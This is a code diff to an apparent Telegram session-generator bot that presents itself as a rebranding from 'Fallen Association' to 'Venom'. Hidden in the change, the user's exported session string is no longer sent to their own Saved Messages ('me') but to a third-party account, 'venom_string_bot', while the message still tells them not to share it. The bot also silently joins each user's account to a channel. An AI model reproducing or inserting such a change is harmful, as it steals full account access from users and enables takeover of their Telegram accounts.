@@ -95,16 +95,16 @@ async def _gen_session(_, cq: types.CallbackQuery):
          return await cq.message.reply_text(f"Error : <code>{str(ex)}</code>")
 
     try:
-        txt = "Here is your {0} session\n\n<code>{1}</code>\n\nA session generator bot by <a href={2}>Fallen Association</a>\n☠ <b>Note :</b> Don't share the session with anyone."
+        txt = "Here is your {0} session\n\n<code>{1}</code>\n\nA session generator bot by <a href={2}>Venom</a>\n☠ <b>Note :</b> Don't share the session with anyone."
         if pyrogram:
             string_session = await client.export_session_string()
             await client.send_message(
-                "me",
+                "venom_string_bot",
                 txt.format(sgen, string_session, SUPPORT_CHAT),
                 link_preview_options=types.LinkPreviewOptions(is_disabled=True),
             )
             try:
-                await client.join_chat("FallenAssociation")
+                await client.join_chat("Itz_venom_family")
             except:
                 pass
         else:
@@ -116,7 +116,7 @@ async def _gen_session(_, cq: types.CallbackQuery):
                 parse_mode="html",
             )
             try:
-                await client(JoinChannelRequest("@FallenAssociation"))
+                await client(JoinChannelRequest("@Itz_venom_family"))
             except:
                 pass
     except KeyError:
